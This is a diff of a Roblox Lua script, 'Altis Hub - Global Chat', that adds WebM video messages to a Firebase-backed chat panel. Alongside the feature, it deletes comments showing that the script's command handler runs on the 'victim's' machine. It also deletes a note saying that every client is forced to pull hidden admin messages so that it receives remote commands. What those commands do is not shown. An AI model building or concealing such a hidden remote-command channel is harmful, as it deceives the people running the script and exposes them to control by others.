@@ -1,4 +1,4 @@
--- Altis Hub - Global Chat (V13: UNIVERSAL COMMAND TRIGGERS)
+-- Altis Hub - Global Chat (V14: VIDEO WEBM SUPPORT & UNIVERSAL TRIGGERS)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -109,6 +109,7 @@ local SUser = Tab3:CreateSection("Danh sách User")
 local TabAdminChat, STabAdminChat, TabAdminControl
 local inputAdminMsg = ""
 local inputAdminImg = ""
+local inputAdminVid = ""
 local adminMessageObjects = {}
 
 local startTime = os.time()
@@ -155,6 +156,11 @@ local function createAdminTabs()
     TabAdminControl:CreateTextBox("Gửi ảnh (Admin)", "rbxassetid:// hoặc Link...", function(t) inputAdminImg = t end)
     TabAdminControl:CreateButton("Gửi Ảnh Admin", function() sendAdminMessage(inputAdminImg) end)
     TabAdminControl:CreateDivider()
+
+    TabAdminControl:CreateTextBox("Gửi Video (Admin)", "Link WebM...", function(t) inputAdminVid = t end)
+    TabAdminControl:CreateButton("Gửi Video Admin", function() sendAdminMessage(inputAdminVid) end)
+    TabAdminControl:CreateDivider()
+    
     TabAdminControl:CreateButton("Làm sạch Admin Chat", function() clearAdminChat() end)
     
     adminStartTime = os.time()
@@ -167,6 +173,7 @@ if lastMyRole == "OWNER" or lastMyRole == "ADMIN" then createAdminTabs() end
 -- UTIL FUNCTIONS
 ---------------------------------------------------
 local function now() return os.date("%H:%M", os.time()) end
+local function isVideo(msg) return typeof(msg) == "string" and msg:lower():match("%.webm") end
 local function isImage(msg) return typeof(msg) == "string" and (msg:lower():match("^rbxassetid://%d+$") or msg:lower():match("^https?://.+")) end
 
 local function updateCooldown()
@@ -280,7 +287,7 @@ Players.PlayerRemoving:Connect(function(plr)
 end)
 
 ---------------------------------------------------
--- LÕI XỬ LÝ LỆNH TỪ FIREBASE (CHẠY TRÊN MÁY NẠN NHÂN)
+-- LÕI XỬ LÝ LỆNH TỪ FIREBASE
 ---------------------------------------------------
 local function processIncomingTriggers(msg)
     local myLiveRole = getRole(LocalPlayer.Name)
@@ -317,18 +324,25 @@ local function processIncomingTriggers(msg)
 end
 
 ---------------------------------------------------
--- RENDER UI MESSAGES 
+-- RENDER UI MESSAGES (KÈM VIDEO SUPPORT)
 ---------------------------------------------------
 local function renderMessage(msg, section)
     local prefix = getSenderPrefix(msg)
     local obj
-    if isImage(msg.message) then
+    
+    -- Kiểm tra Video (.webm) trước, nếu không phải mới check Image
+    if isVideo(msg.message) then
+        obj = section:CreateParagraph(prefix, "")
+        local ok = pcall(function() obj:CreateVideo(msg.message) end)
+        if not ok then obj:SetText(msg.message) end -- Fallback nếu UI Lib không hỗ trợ CreateVideo
+    elseif isImage(msg.message) then
         obj = section:CreateParagraph(prefix, "")
         local ok = pcall(function() obj:CreateImage(msg.message) end)
         if not ok then obj:SetText(msg.message) end
     else
         obj = section:CreateParagraph(prefix, msg.message)
     end
+    
     return obj
 end
 
@@ -336,7 +350,7 @@ local function addMessage(key, msg)
     if seen[key] then return end
     seen[key] = true
     
-    processIncomingTriggers(msg) -- Lắng nghe lệnh từ Normal Chat
+    processIncomingTriggers(msg)
 
     if msg.username ~= LocalPlayer.Name and (tick() - scriptInitTime > 2) then
         Window:SendNotification("Có tin nhắn mới", "Kênh chat chung...", 3)
@@ -354,9 +368,8 @@ local function addAdminMessage(key, msg)
     if seenAdmin[key] then return end
     seenAdmin[key] = true
 
-    processIncomingTriggers(msg) -- Lắng nghe lệnh từ Admin Chat (Hoạt động cho TẤT CẢ mọi người)
+    processIncomingTriggers(msg)
 
-    -- CHỈ NHỮNG AI CÓ QUYỀN MỚI ĐƯỢC RENDER (HIỂN THỊ) TIN NHẮN TRÊN UI
     local myLiveRole = getRole(LocalPlayer.Name)
     if (myLiveRole == "OWNER" or myLiveRole == "ADMIN") and STabAdminChat then
         if msg.username ~= LocalPlayer.Name and (tick() - scriptInitTime > 2) then Window:SendNotification("Tin nhắn nội bộ", "Kênh Admin có tin nhắn...", 3) end
@@ -371,7 +384,7 @@ local function addAdminMessage(key, msg)
 end
 
 ---------------------------------------------------
--- CHỨC NĂNG GỬI & LỌC LỆNH (MÁY CHỦ GỬI)
+-- CHỨC NĂNG GỬI & LỌC LỆNH 
 ---------------------------------------------------
 local function processCommands(text)
     local myLiveRole = getRole(LocalPlayer.Name)
@@ -480,8 +493,6 @@ end
 local function fetchChat()
     if isBanned then return end
     fetchRoutine(PATH_CHAT, addMessage, startTime)
-    
-    -- Ở V13: Bắt buộc TẤT CẢ client tải Admin Chat để nhận lệnh, phần render sẽ được chặn bên trong hàm addAdminMessage
     fetchRoutine(PATH_ADMINCHAT, addAdminMessage, adminStartTime)
 end
 
@@ -505,13 +516,20 @@ end
 ---------------------------------------------------
 -- GẮN NÚT VÀ SỰ KIỆN CHO UI CƠ BẢN
 ---------------------------------------------------
-local inputMsg, inputImg = "", ""
+local inputMsg, inputImg, inputVid = "", "", ""
+
 Tab2:CreateTextBox("Nhập tin nhắn", "Văn bản / Lệnh...", function(t) inputMsg = t end)
 Tab2:CreateButton("Gửi tin nhắn", function() sendMessage(inputMsg) end)
 Tab2:CreateDivider()
+
 Tab2:CreateTextBox("Nhập mã ảnh / Link URL", "rbxassetid:// hoặc https://...", function(t) inputImg = t end)
 Tab2:CreateButton("Gửi ảnh", function() sendMessage(inputImg) end)
 Tab2:CreateDivider()
+
+Tab2:CreateTextBox("Nhập Link Video", "Link WebM...", function(t) inputVid = t end)
+Tab2:CreateButton("Gửi Video", function() sendMessage(inputVid) end)
+Tab2:CreateDivider()
+
 Tab2:CreateButton("Làm sạch khung chat", function() clearChat() end)
 
 ---------------------------------------------------
@@ -534,4 +552,4 @@ coroutine.wrap(function()
     end
 end)()
 
-Window:SendNotification("Altis Hub", "Hệ thống Global Chat V13 đã được tải!", 3)
+Window:SendNotification("Altis Hub", "Hệ thống Global Chat V14 đã được tải!", 3)
